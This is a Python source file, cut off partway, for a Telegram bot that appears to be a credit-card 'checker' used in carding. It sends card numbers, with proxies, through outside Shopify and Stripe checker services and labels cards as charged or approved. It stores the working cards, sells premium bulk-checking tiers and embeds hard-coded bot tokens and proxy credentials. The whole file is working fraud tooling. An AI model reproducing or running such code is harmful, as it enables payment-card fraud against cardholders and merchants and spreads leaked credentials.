from telethon import TelegramClient, events, Button
from telethon.errors import FloodWaitError
from telethon.tl.types import KeyboardButtonCallback
from telethon import Button
from flask import Flask
import threading
from telethon import events

import requests
import random
import datetime
import json
import os
import re
import asyncio
import time
import string
import hashlib
import aiohttp
import aiofiles

from urllib.parse import urlparse
from urllib.parse import quote

# Config
API_ID = 37250868
API_HASH = "370eaf1a9ee59f21dd83ca8257efd6fd"
BOT_TOKEN = "8337561320:AAE9yTh7Oog0RVoP4QL8JXiOoFE4QGj84kc" # Replace with your Bot Token
ADMIN_ID = [7899583720, 8409853085,] # Replace with your Admin ID(s)
GROUP_ID = -1003678203420 # Replace with your Group ID
PREMIUM_FILE = "premium.json"
# ... existing files ...
STRIPE_SITES_FILE = "stripe_sites.json"   # ← YE ADD KARO
FREE_FILE = "free_users.json"
SITE_FILE = "user_sites.json"
KEYS_FILE = "keys.json"
CC_FILE = "cc.txt"
BANNED_FILE = "banned_users.json"
PROXY_FILE = "proxy.json"

client = TelegramClient('cc_bot', API_ID, API_HASH)
app = Flask(__name__)

@app.route("/")
def home():
    return "Bot Running ✅"

def run_web():
    app.run(
        host="0.0.0.0",
        port=int(os.environ.get("PORT", 20000))
    )

threading.Thread(target=run_web, daemon=True).start()

ACTIVE_MTXT_PROCESSES = {}
TEMP_WORKING_SITES = {}  # Store working sites temporarily for /check command

# --- Utility Functions ---

async def create_json_file(filename):
    try:
        if not os.path.exists(filename):
            async with aiofiles.open(filename, "w") as file:
                await file.write(json.dumps({}))
    except Exception as e:
        print(f"Error creating {filename}: {str(e)}")

async def initialize_files():
    for file in [PREMIUM_FILE, FREE_FILE, SITE_FILE, KEYS_FILE, BANNED_FILE, PROXY_FILE, STRIPE_SITES_FILE]:  # ← STRIPE_SITES_FILE add kiya
        await create_json_file(file)

async def load_json(filename):
    try:
        if not os.path.exists(filename):
            await create_json_file(filename)
        async with aiofiles.open(filename, "r") as f:
            content = await f.read()
            return json.loads(content)
    except Exception as e:
        print(f"Error loading {filename}: {str(e)}")
        return {}

async def save_json(filename, data):
    try:
        async with aiofiles.open(filename, "w") as f:
            await f.write(json.dumps(data, indent=4))
    except Exception as e:
        print(f"Error saving {filename}: {str(e)}")

def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))

async def is_premium_user(user_id):
    premium_users = await load_json(PREMIUM_FILE)
    user_data = premium_users.get(str(user_id))
    if not user_data: return False
    expiry_date = datetime.datetime.fromisoformat(user_data['expiry'])
    current_date = datetime.datetime.now()
    if current_date > expiry_date:
        del premium_users[str(user_id)]
        await save_json(PREMIUM_FILE, premium_users)
        return False
    return True

async def add_premium_user(user_id, days):
    premium_users = await load_json(PREMIUM_FILE)
    expiry_date = datetime.datetime.now() + datetime.timedelta(days=days)
    premium_users[str(user_id)] = {
        'expiry': expiry_date.isoformat(),
        'added_by': 'admin',
        'days': days
    }
    await save_json(PREMIUM_FILE, premium_users)

async def remove_premium_user(user_id):
    premium_users = await load_json(PREMIUM_FILE)
    if str(user_id) in premium_users:
        del premium_users[str(user_id)]
        await save_json(PREMIUM_FILE, premium_users)
        return True
    return False

async def is_banned_user(user_id):
    banned_users = await load_json(BANNED_FILE)
    return str(user_id) in banned_users

async def ban_user(user_id, banned_by):
    banned_users = await load_json(BANNED_FILE)
    banned_users[str(user_id)] = {
        'banned_at': datetime.datetime.now().isoformat(),
        'banned_by': banned_by
    }
    await save_json(BANNED_FILE, banned_users)

async def unban_user(user_id):
    banned_users = await load_json(BANNED_FILE)
    if str(user_id) in banned_users:
        del banned_users[str(user_id)]
        await save_json(BANNED_FILE, banned_users)
        return True
    return False

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as res:
                if res.status != 200: return "BIN Info Not Found", "-", "-", "-", "-", "🏳️"
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    brand = data.get('brand', '-')
                    bin_type = data.get('type', '-')
                    level = data.get('level', '-')
                    bank = data.get('bank', '-')
                    country = data.get('country_name', '-')
                    flag = data.get('country_flag', '🏳️')
                    return brand, bin_type, level, bank, country, flag
                except json.JSONDecodeError: return "-", "-", "-", "-", "-", "🏳️"
    except Exception: return "-", "-", "-", "-", "-", "🏳️"

def normalize_card(text):
    if not text: return None
    text = text.replace('\n', ' ').replace('/', ' ')
    numbers = re.findall(r'\d+', text)
    cc = mm = yy = cvv = ''
    for part in numbers:
        if len(part) == 16: cc = part
        elif len(part) == 4 and part.startswith('20'): yy = part[2:]
        elif len(part) == 2 and int(part) <= 12 and mm == '': mm = part
        elif len(part) == 2 and not part.startswith('20') and yy == '': yy = part
        elif len(part) in [3, 4] and cvv == '': cvv = part
    if cc and mm and yy and cvv: return f"{cc}|{mm}|{yy}|{cvv}"
    return None

def extract_json_from_response(response_text):
    if not response_text: return None
    start_index = response_text.find('{')
    if start_index == -1: return None
    brace_count = 0
    end_index = -1
    for i in range(start_index, len(response_text)):
        if response_text[i] == '{': brace_count += 1
        elif response_text[i] == '}':
            brace_count -= 1
            if brace_count == 0:
                end_index = i
                break
    if end_index == -1: return None
    json_text = response_text[start_index:end_index + 1]
    try: return json.loads(json_text)
    except json.JSONDecodeError: return None

async def get_user_proxy(user_id):
    """Get a random proxy for a specific user"""
    proxies = await load_json(PROXY_FILE)
    user_proxies = proxies.get(str(user_id), [])
    
    if not user_proxies:
        return None
    
    # Return a random proxy - user_proxies is a list, so we need to check if it's not empty
    if len(user_proxies) == 0:
        return None
    
    return random.choice(user_proxies)

async def remove_dead_proxy(user_id, proxy_url):
    """Remove a dead proxy from user's list"""
    proxies = await load_json(PROXY_FILE)
    user_proxies = proxies.get(str(user_id), [])
    
    # Find and remove the dead proxy
    for proxy_data in user_proxies:
        if proxy_data['proxy_url'] == proxy_url:
            user_proxies.remove(proxy_data)
            
            if user_proxies:
                proxies[str(user_id)] = user_proxies
            else:
                del proxies[str(user_id)]
            
            await save_json(PROXY_FILE, proxies)
            break

async def get_all_user_proxies(user_id):
    """Get all proxies for a specific user"""
    proxies = await load_json(PROXY_FILE)
    return proxies.get(str(user_id), [])

async def check_card_random_site(card, sites, user_id=None):
    if not sites:
        return {"Response": "ERROR", "Price": "-", "Gateway": "-"}, -1

    random.shuffle(sites)

    for selected_site in sites:
        site_index = sites.index(selected_site) + 1

        proxy_data = await get_user_proxy(user_id) if user_id else None

        try:
            if not selected_site.startswith("http"):
                selected_site = f"https://{selected_site}"

            proxy_str = None
            if proxy_data:
                ip = proxy_data.get("ip")
                port = proxy_data.get("port")
                username = proxy_data.get("username")
                password = proxy_data.get("password")

                if username and password:
                    proxy_str = f"{ip}:{port}:{username}:{password}"
                else:
                    proxy_str = f"{ip}:{port}"

            url = f"https://nik.cards/shopify?site={selected_site}&cc={card}&proxy=ca-mon.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2"
            if proxy_str:
                url += f"&proxy={proxy_str}"

            timeout = aiohttp.ClientTimeout(total=30)

            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(url) as res:

                    if res.status != 200:
                        continue

                    response_text = await res.text()

                    try:
                        response_json = json.loads(response_text)
                    except:
                        response_json = {"Response": response_text[:300]}

                    api_response = response_json.get("Response", response_text)

                    skip_errors = [
                        "Site not supported",
                        "Site requires login",
                        "MERCHANDISE_EXPECTED_PRICE_MISMATCH",
                        "HTTP_ERROR",
                        "Cloudflare",
                        "403",
                        "404",
                        "500",
                        "timeout",
                        "connection",
                        "proxy",
                    ]

                    if any(x.lower() in api_response.lower() for x in skip_errors):
                        continue

                    price = response_json.get("Price", "-")
                    if price != "-":
                        price = f"${price}"

                    gateway = response_json.get("Gateway", "Shopify")

                    if (
                        proxy_data
                        and user_id
                        and (
                            "proxy" in api_response.lower()
                            or "connection" in api_response.lower()
                        )
                    ):
                        await remove_dead_proxy(
                            user_id,
                            proxy_data.get("proxy_url"),
                        )
                        return {
                            "Response": "⚠️ Proxy is dead!",
                            "Price": "-",
                            "Gateway": "-",
                        }, site_index

                    # === IMPROVED CHARGED + APPROVED ===
                    response_lower = api_response.lower()
                    if (
                        "charged" in response_lower or
                        "order placed" in response_lower or
                        "ORDER_PAID" in api_response or
                        "Order completed" in api_response or
                        "💎" in api_response or
                        "insufficient_funds" in response_lower
                    ):
                        return {
                            "Response": api_response,
                            "Price": price,
                            "Gateway": gateway,
                            "Status": "Charged",
                        }, site_index

                    elif any(x in response_lower for x in ["otp_required", "incorrect_cvc", "requires_action", "3d", "3ds", "approved", "success"]):
                        return {
                            "Response": api_response,
                            "Price": price,
                            "Gateway": gateway,
                            "Status": "Approved",
                        }, site_index

                    return {
                        "Response": api_response,
                        "Price": price,
                        "Gateway": gateway,
                        "Status": api_response,
                    }, site_index

        except Exception:
            continue

    return {
        "Response": "No working site found",
        "Price": "-",
        "Gateway": "-",
    }, -1


async def check_card_specific_site(card, site, user_id=None):
    proxy_data = await get_user_proxy(user_id) if user_id else None

    try:
        if not site.startswith("http"):
            site = f"https://{site}"

        proxy_str = None
        if proxy_data:
            ip = proxy_data.get("ip")
            port = proxy_data.get("port")
            username = proxy_data.get("username")
            password = proxy_data.get("password")

            if username and password:
                proxy_str = f"{ip}:{port}:{username}:{password}"
            else:
                proxy_str = f"{ip}:{port}"

        url = f"https://nik.cards/shopify?site={site}&cc={card}&proxy=ca-mon.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2"
        if proxy_str:
            url += f"&proxy={proxy_str}"

        timeout = aiohttp.ClientTimeout(total=30)

        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:

                if res.status != 200:
                    return {
                        "Response": f"HTTP_ERROR_{res.status}",
                        "Price": "-",
                        "Gateway": "-",
                    }

                response_text = await res.text()

                try:
                    response_json = json.loads(response_text)
                except:
                    response_json = {"Response": response_text[:300]}

                api_response = response_json.get("Response", response_text)

                price = response_json.get("Price", "-")
                if price != "-":
                    price = f"${price}"

                gateway = response_json.get("Gateway", "Shopify")

                if (
                    proxy_data
                    and user_id
                    and (
                        "proxy" in api_response.lower()
                        or "connection" in api_response.lower()
                    )
                ):
                    await remove_dead_proxy(
                        user_id,
                        proxy_data.get("proxy_url"),
                    )

                    return {
                        "Response": "⚠️ Proxy is dead!",
                        "Price": "-",
                        "Gateway": "-",
                    }

                if (
                    "charged" in api_response.lower()
                    or "order placed" in api_response.lower()
                    or "ORDER_PAID" in api_response
                    or "Order completed" in api_response
                    or "💎" in api_response
                ):
                    return {
                        "Response": api_response,
                        "Price": price,
                        "Gateway": gateway,
                        "Status": "Charged",
                    }

                return {
                    "Response": api_response,
                    "Price": price,
                    "Gateway": gateway,
                    "Status": api_response,
                }

    except Exception:
        return {
            "Response": "No working site found",
            "Price": "-",
            "Gateway": "-",
        }

    return {
        "Response": "No working site found",
        "Price": "-",
        "Gateway": "-",
    }

def extract_card(text):
    if not text:
        return None
    
    text = str(text).strip()
    
    # === MOST RELIABLE: First 4 parts after | ===
    parts = re.findall(r'\d+', text)
    if len(parts) >= 4:
        cc = parts[0]
        mm = parts[1].zfill(2)
        yy = parts[2]
        cvv = parts[3]
        
        if len(cc) >= 13 and len(cc) <= 19 and len(mm) == 2 and len(yy) >= 2 and len(cvv) in [3,4]:
            if len(yy) == 4:
                yy = yy[2:]
            yy = yy.zfill(2)
            cvv = cvv[:4]
            return f"{cc}|{mm}|{yy}|{cvv}"
    
    # Regex fallback for standard format
    match = re.search(r'(\d{13,19})\D*(\d{1,2})\D*(\d{2,4})\D*(\d{3,4})', text)
    if match:
        cc, mm, yy, cvv = match.groups()
        if len(yy) == 4:
            yy = yy[2:]
        mm = mm.zfill(2)
        yy = yy.zfill(2)
        cvv = cvv[:4]
        return f"{cc}|{mm}|{yy}|{cvv}"
    
    return normalize_card(text)
    
async def can_use(user_id, chat):
    # ✅ Admin always has full access everywhere
    if user_id in ADMIN_ID:
        if chat.id == user_id:
            return True, "premium_private"
        return True, "premium_group"

    if await is_banned_user(user_id):
        return False, "banned"

    is_premium = await is_premium_user(user_id)
    is_private = chat.id == user_id

    if is_private:
        if is_premium:
            return True, "premium_private"
        else:
            return False, "no_access"
    else:
        if is_premium:
            return True, "premium_group"
        else:
            return True, "group_free"

def get_cc_limit(access_type, user_id=None):
    if user_id and user_id in ADMIN_ID:
        return 200000  # Admin full power
    
    if access_type in ["premium_private", "premium_group"]:
        return 50000   # 50k for premium
    
    elif access_type == "group_free":
        return 5000    # Free group 5k
    
    return 0
  # ← Top pe import me ye add kar (agar nahi hai to)


async def check_card_stripe(card, site=None, user_id=None):
    proxy_data = await get_user_proxy(user_id) if user_id else None
    try:
        if not site:
            stripe_sites = await get_user_stripe_sites(user_id)
            site = random.choice(stripe_sites) if stripe_sites else "dilaboards.com"
        
        # === ULTRA STRICT CARD CLEANING ===
        clean_card = re.sub(r'[^0-9|]', '', str(card).strip().replace(' ', '').replace('\n', ''))
        parts = [p for p in clean_card.split('|') if p]
        
        if len(parts) >= 4:
            cc = parts[0]
            mm = parts[1].zfill(2)
            yy = parts[2]
            if len(yy) == 4: yy = yy[2:]
            yy = yy.zfill(2)
            cvv = parts[3][:4]
            clean_card = f"{cc}|{mm}|{yy}|{cvv}"
        else:
            return {"Response": "Invalid card format after cleaning", "Price": "N/A", "Gateway": "Stripe", "Status": "Error"}
        
        print(f"[STRIPE DEBUG] Card: {clean_card} | Site: {site}")
        
        # === EXACT WORKING URL ===
        base_url = f"https://stripe-auto-dsam.onrender.com/gateway=autostripe/key=xebec/site={site}/cc={clean_card}"
        
        if proxy_data:
            ip = proxy_data.get('ip')
            port = proxy_data.get('port')
            username = proxy_data.get('username')
            password = proxy_data.get('password')
            proxy_str = f"{ip}:{port}:{username}:{password}" if username and password else f"{ip}:{port}"
            base_url += f"&proxy={proxy_str}"

        timeout = aiohttp.ClientTimeout(total=70)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(base_url) as res:
                text = await res.text()
                print(f"[STRIPE DEBUG] Status: {res.status} | Body: {text[:700]}")
                
                if res.status != 200:
                    return {"Response": f"HTTP_ERROR_{res.status}: {text[:400]}", "Price": "N/A", "Gateway": "Stripe", "Status": "Error"}
                
                try:
                    data = json.loads(text)
                except:
                    data = {"response": text, "status": "Unknown"}
                
                api_response = data.get('response') or data.get('Response') or text
                status_field = data.get('status') or ""
                price = data.get('Price') or data.get('price') or "N/A"   # fallback
                
                status_lower = str(api_response).lower() + " " + str(status_field).lower()
                
                # === APPROVAL LOGIC (Shopify jaisa) ===
                if any(x in status_lower for x in ["approved", "success", "charged", "order placed", "payment successful", "live", "valid", "otp_required", "incorrect_cvc", "3d", "3ds", "requires_action"]):
                    if any(x in status_lower for x in ["3d", "3ds", "requires_action", "otp_required", "incorrect_cvc"]):
                        return {"Response": api_response, "Price": price, "Gateway": "Shopify", "Status": "Approved_3DS"}
                    
                    # INSUFFICIENT_FUNDS ko direct CHARGED bana do
                    if "insufficient_funds" in status_lower:
                        return {"Response": api_response, "Price": price, "Gateway": "Shopify", "Status": "Charged"}
                    
                    return {"Response": api_response, "Price": price, "Gateway": "Shopify", "Status": "Charged"}
                
                return {"Response": api_response, "Price": price, "Gateway": "Shopify", "Status": "Declined"}
    except Exception as e:
        return {"Response": f"Error: {str(e)}", "Price": "N/A", "Gateway": "Stripe", "Status": "Error"}
async def process_st_card(event, access_type):
    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data:
        return await event.reply("⚠️ 𝙋𝙧𝙤𝙭𝙮 𝙍𝙚𝙦𝙪𝙞𝙧𝙚𝙙!\n\n`/addpxy ip:port:username:password`")

    card = None
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text: 
            card = extract_card(replied_msg.text)
    else:
        card = extract_card(event.raw_text)

    if not card:
        return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩 ➜ /st 4893960085072590|06|26|779")

    loading_msg = await event.reply("🍳")
    start_time = time.time()

    async def animate_loading():
        emojis = ["🍳", "🍳🍳", "🍳🍳🍳"]
        i = 0
        while True:
            try:
                await loading_msg.edit(emojis[i % 3])
                await asyncio.sleep(0.5)
                i += 1
            except: break

    loading_task = asyncio.create_task(animate_loading())

    try:
        res = await check_card_stripe(card, site=None, user_id=event.sender_id)
        loading_task.cancel()
        end_time = time.time()
        elapsed_time = round(end_time - start_time, 2)

        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])

        response_lower = str(res.get("Response", "")).lower()
        
        # === IMPROVED LOGIC ===
        if res.get("Status") in ["Charged", "Approved"] or "charged" in response_lower or "insufficient_funds" in response_lower:
            status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
            await save_approved_card(card, "Charged", res.get('Response'), "Stripe", res.get('Price', '-'))
        elif any(x in response_lower for x in ["approved", "otp_required", "incorrect_cvc", "requires_action", "3d", "3ds", "success"]):
            status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
            await save_approved_card(card, "APPROVED", res.get('Response'), "Stripe", res.get('Price', '-'))
        else:
            status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"

        msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ Stripe
𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {res.get('Response')}

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```

𝗧𝗼𝗼𝙠 {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝙨"""

        await loading_msg.delete()
        result_msg = await event.reply(msg)
        if "𝘾𝙃𝘼𝙍𝙂𝙀𝘿" in status_header or "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿" in status_header:
            await pin_charged_message(event, result_msg)

    except Exception as e:
        loading_task.cancel()
        await loading_msg.delete()
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")
                
async def save_approved_card(card, status, response, gateway, price):
    try:
        async with aiofiles.open(CC_FILE, "a", encoding="utf-8") as f:
            await f.write(f"{card} | {status} | {response} | {gateway} | {price}\n")
    except Exception as e: print(f"Error saving card to {CC_FILE}: {str(e)}")

async def pin_charged_message(event, message):
    try:
        if event.is_group: await message.pin()
    except Exception as e: print(f"Failed to pin message: {e}")

def is_valid_url_or_domain(url):
    domain = url.lower()
    if domain.startswith(('http://', 'https://')):
        try: parsed = urlparse(url)
        except: return False
        domain = parsed.netloc
    domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$'
    return bool(re.match(domain_pattern, domain))

def extract_urls_from_text(text):
    clean_urls = set()
    lines = text.split('\n')
    for line in lines:
        cleaned_line = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line.strip()).split(' ')[0]
        if cleaned_line and is_valid_url_or_domain(cleaned_line): clean_urls.add(cleaned_line)
    return list(clean_urls)

def parse_proxy_format(proxy):
    """Parse proxy in multiple formats"""
    import re
    
    proxy = proxy.strip()
    if not proxy:
        return None
    
    proxy_type = 'http'  # default
    
    # Protocol support (socks/http)
    protocol_match = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if protocol_match:
        proxy_type = protocol_match.group(1).lower()
        proxy = protocol_match.group(2)
    
    host = ''
    port = ''
    username = ''
    password = ''
    
    # === TERA MAIN FORMAT: ip:port:username:password ===
    match = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
    if match:
        host, port, username, password = match.groups()
    
    # Format: username:password@host:port
    elif re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy):
        match = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
        username, password, host, port = match.groups()
    
    # Format: host:port@username:password
    elif re.match(r'^([a-zA-Z0-9\.\-]+):(\d+)@([^:]+):(.+)$', proxy):
        match = re.match(r'^([a-zA-Z0-9\.\-]+):(\d+)@([^:]+):(.+)$', proxy)
        host, port, username, password = match.groups()
    
    # Format: host:port (no auth)
    elif re.match(r'^([^:@]+):(\d+)$', proxy):
        match = re.match(r'^([^:@]+):(\d+)$', proxy)
        host, port = match.groups()
    
    else:
        return None
    
    # Validation
    if not host or not port:
        return None
    
    try:
        port_num = int(port)
        if port_num <= 0 or port_num > 65535:
            return None
    except ValueError:
        return None
    
    # Build proxy URL
    if username and password:
        if proxy_type in ['socks5', 'socks4']:
            proxy_url = f'{proxy_type}://{username}:{password}@{host}:{port}'
        else:
            proxy_url = f'http://{username}:{password}@{host}:{port}'
    else:
        if proxy_type in ['socks5', 'socks4']:
            proxy_url = f'{proxy_type}://{host}:{port}'
        else:
            proxy_url = f'http://{host}:{port}'
    
    return {
        'ip': host,
        'port': port,
        'username': username if username else None,
        'password': password if password else None,
        'proxy_url': proxy_url,
        'type': proxy_type
    }

async def test_proxy(proxy_url):
    """Test if proxy is working"""
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get('http://api.ipify.org?format=json', proxy=proxy_url) as res:
                if res.status == 200:
                    data = await res.json()
                    return True, data.get('ip', 'Unknown')
                return False, None
    except Exception as e:
        return False, str(e)

def is_site_dead(response_text):
    if not response_text: return True
    response_lower = response_text.lower()
    dead_indicators = [
        'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'HTTPERROR504', 'http error',
    'httperror504', 'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
        'gateway timeout', 'network error', 'connection reset', 
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
        'url rejected', 'malformed input', 'amount_too_small', 'amount too small','SITE DEAD', 'site dead',
        'CAPTCHA_REQUIRED', 'captcha_required', 'captcha required', 'Site errors', 'Site errors: Failed to tokenize card', 'Failed'
    ]
    return any(indicator in response_lower for indicator in dead_indicators)

async def test_single_site(site, test_card="4031630422575208|01|2030|280", user_id=None):
    try:
        if not site.startswith('http'):
            site = f'https://{site}'
        
        proxy_data = await get_user_proxy(user_id) if user_id else None
        proxy_str = None
        if proxy_data:
            ip = proxy_data.get('ip')
            port = proxy_data.get('port')
            username = proxy_data.get('username')
            password = proxy_data.get('password')
            if username and password:
                proxy_str = f"{ip}:{port}:{username}:{password}"
            else:
                proxy_str = f"{ip}:{port}"
        
        # === TERA NAYA API ===
        url = f"https://nik.cards/shopify?site={site}&cc={test_card}&proxy=ca-mon.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2"
        
        if proxy_str:
            url += f"&proxy={proxy_str}"
        
        timeout = aiohttp.ClientTimeout(total=90)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                response_text = await res.text()
    # ===== DEBUG =====
    
                print("URL:", url)
                print("STATUS:", res.status)
                print("BODY:", response_text)
    

    # Agar HTTP error hai to bhi body dikhao
                if res.status != 200:
                    return {
                        "status": "dead",
                        "response": f"HTTP_ERROR_{res.status}\n{response_text}",
                        "site": site,
                        "price": "-"
                    }

                try:
                    data = json.loads(response_text)
                except Exception:
                    data = {"Response": response_text}

    # API me Response ya response dono ho sakte hain
        response_msg = (
            data.get("Response")
            or data.get("response")
            or response_text
        )

        price = data.get("Price") or data.get("price") or "-"
        if price != "-":
            price = f"${price}"

        if proxy_data and user_id and (
            "proxy" in response_msg.lower()
            or "connection" in response_msg.lower()
        ):
            await remove_dead_proxy(user_id, proxy_data.get("proxy_url"))
            return {
                "status": "proxy_dead",
                "response": "⚠️ Proxy is dead!",
                "site": site,
                "price": "-"
            }

        if is_site_dead(response_msg):
            return {
                "status": "dead",
                "response": response_msg,
                "site": site,
                "price": price
            }

        return {
            "status": "working",
            "response": response_msg,
            "site": site,
            "price": price
        }
    except Exception as e:
        return {
            "status": "dead",
            "response": str(e),
            "site": site,
            "price": "-"
        }
    
    
def banned_user_message():
    return "🚫 **𝙔𝙤𝙪 𝘼𝙧𝙚 𝘽𝙖𝙣𝙣𝙚𝙙!**\n\n𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙡𝙡𝙤𝙬𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩.\n\n𝙁𝙤𝙧 𝙖𝙥𝙥𝙚𝙖𝙡, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @Alonee_op"

# ====================== STRIPE AUTH FUNCTIONS ======================
async def get_user_stripe_sites(user_id):
    sites = await load_json(STRIPE_SITES_FILE)
    user_sites = sites.get(str(user_id), [])
    if not user_sites:
        return ["dilaboards.com"]  # default
    return user_sites

async def add_stripe_site(user_id, site):
    sites = await load_json(STRIPE_SITES_FILE)
    user_sites = sites.get(str(user_id), [])
    if site not in user_sites:
        user_sites.append(site)
        sites[str(user_id)] = user_sites
        await save_json(STRIPE_SITES_FILE, sites)
        return True
    return False
    
def access_denied_message_with_button():
    """Returns access denied message and join group button"""
    message = "🚫 **Access Denied!** This command requires premium access or group usage."
    buttons = [[Button.url("🚀 Join Group for Free Access", "https://t.me/alonechacha")]]
    return message, buttons

# --- Bot Command Handlers ---

@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|cmds?|commands?)$'))
async def start(event):
    _, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())

    text = """🚀 **Hello and welcome!**
#update
Here are the available command categoriess.

** Shopify Self **
`/sh` ⇾ Check a single CC.
`/msh` ⇾ Check multiple CCs from text.
`=` ⇾ Check CCs from a `.txt` file.
`/ran` ⇾ Check CCs from `.txt` using random sites.
`/deletesites` ⇾ Delete all saved sites.
`/addtxtsites` ⇾ Import all sites from a replied `.txt` file.
`/setprxy` ⇾ Import all proxy set from a replied `.txt` file.

** Stripe Auth **
`/st` ⇾ Check a single CC.
`/mst` ⇾ Check multiple CCs from text.
`/mstxt` ⇾ Check CCs from a `.txt` file.
`/sadd` <site> ⇾ Add Stripe Auth site for ST commands.
`/deletesites` ⇾ Delete all saved sites.
`/addtxtsites` ⇾ Import all sites from a replied `.txt` file.

** Bot & User Management **
`/add` <site> ⇾ Add site(s) to your DB.
`/rm` <site> ⇾ Remove site(s) from your DB.
`/check` ⇾ Test your saved sites.
`/info` ⇾ Get your user information.
`/redeem` <key> ⇾ Redeem a premium key.
/addtxtsites  ⇾  
** Proxy Management (Private Only) **
`/addpxy` <proxy> ⇾ Add proxy (max 10, ip:port:user:pass).
`/proxy` ⇾ View all your saved proxies.
`/rmpxy` <index|all> ⇾ Remove proxy by index or all.
"""

    if access_type in ["premium_private", "premium_group"]:
        text += f"\n💎 **Status:** Premium Access (`{get_cc_limit(access_type, event.sender_id)}` CCs)"
    else:
        text += f"\n🆓 **Status:** Group User (`{get_cc_limit(access_type, event.sender_id)}` CCs)"

    await event.reply(text)

@client.on(events.NewMessage(pattern=r'/addtxtsites'))
async def add_txt_sites(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message())

    if not event.reply_to_msg_id:
        return await event.reply("Reply to a .txt file with /addtxtsites")

    reply = await event.get_reply_message()

    if not reply.document:
        return await event.reply("Reply to a .txt file.")

    try:
        file_path = await reply.download_media()

        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            text = f.read()

        txt_sites = extract_urls_from_text(text)

        if not txt_sites:
            try:
                return await event.reply("❌ No valid urls/domains found!")
            except FloodWaitError as e:
                print(f"FloodWait: {e.seconds}s")
                await asyncio.sleep(e.seconds)
                return

        data = await load_json(SITE_FILE)
        user_sites = data.get(str(event.sender_id), [])

        added = 0
        skipped = 0

        for site in txt_sites:
            if site not in user_sites:
                user_sites.append(site)
                added += 1
            else:
                skipped += 1

        data[str(event.sender_id)] = user_sites
        await save_json(SITE_FILE, data)

        os.remove(file_path)

        await event.reply(
            f"✅ TXT Imported Successfully\n\n"
            f"➕ Added: {added}\n"
            f"⚠️ Skipped: {skipped}\n"
            f"📊 Total Saved: {len(user_sites)}"
        )

    except FloodWaitError as e:
        print(f"FloodWait: {e.seconds}s")
        await asyncio.sleep(e.seconds)

    except Exception as e:
        print(f"Error: {e}")
        

        
@client.on(events.NewMessage(pattern='/auth'))
async def auth_user(event):
    if event.sender_id not in ADMIN_ID: return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!")
    try:
        parts = event.raw_text.split()
        if len(parts) != 3: return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /auth {user_id} {days}")
        user_id = int(parts[1])
        days = int(parts[2])
        await add_premium_user(user_id, days)
